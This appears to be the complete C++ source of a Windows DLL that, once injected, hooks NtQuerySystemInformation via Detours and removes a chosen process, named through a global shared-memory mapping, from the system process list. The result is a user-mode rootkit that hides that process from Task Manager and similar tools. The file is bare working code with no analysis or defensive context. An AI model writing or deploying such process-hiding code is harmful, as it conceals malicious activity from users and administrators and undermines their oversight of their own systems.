#define WIN32_LEAN_AND_MEAN 

#include "Header.h"
#include <stdlib.h>
#include <string>
#include <fstream>

using namespace std;

HINSTANCE hInstance;

void InstallHook(LPCSTR dll, LPCSTR function, LPVOID* originalFunction, LPVOID hookedFunction)
{
	HMODULE module = GetModuleHandleA(dll);
	*originalFunction = (LPVOID)GetProcAddress(module, function);

	if (*originalFunction)
		DetourAttach(originalFunction, hookedFunction);
}

wchar_t* process;

NTSTATUS WINAPI Hooked_NtQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength)
{
	NTSTATUS stat = Original_NtQuerySystemInformation(
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);

	if (SystemProcessInformation == SystemInformationClass && stat == 0)
	{
		P_SYSTEM_PROCESS_INFORMATION prev = P_SYSTEM_PROCESS_INFORMATION(SystemInformation);
		P_SYSTEM_PROCESS_INFORMATION curr = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)prev + prev->NextEntryOffset);

		while (prev->NextEntryOffset != NULL) {
			if (!lstrcmpW(curr->ImageName.Buffer, process)) {
				if (curr->NextEntryOffset == 0) {
					prev->NextEntryOffset = 0;		// if above process is at last
				}
				else {
					prev->NextEntryOffset += curr->NextEntryOffset;
				}
				curr = prev;
			}
			prev = curr;
			curr = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)curr + curr->NextEntryOffset);
		}
	}

	return stat;
}

void get_process_name() {
	HANDLE map = OpenFileMappingA(
		FILE_MAP_ALL_ACCESS,
		FALSE,
		"Global\\GetProcessName"
	);

	LPVOID buf = MapViewOfFile(map, // handle to map object
		FILE_MAP_ALL_ACCESS,  // read/write permission
		0,
		0,
		255);

	process = (wchar_t*)malloc(255 * sizeof(wchar_t));
	MultiByteToWideChar(CP_UTF8, 0, (char*)buf, -1, process, 255);

	UnmapViewOfFile(buf);
	CloseHandle(map);
}


DWORD WINAPI WorkThreadFunc()
{
	get_process_name();
	//install hooks
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	
	// hook function
	InstallHook("ntdll.dll", "NtQuerySystemInformation", (LPVOID*)&Original_NtQuerySystemInformation, Hooked_NtQuerySystemInformation);
	DetourTransactionCommit();

	return 0;
}

BOOL APIENTRY DllMain(HMODULE hMoudle, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
	{
		hInstance = hMoudle;
		WorkThreadFunc();
	}
	break;
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}
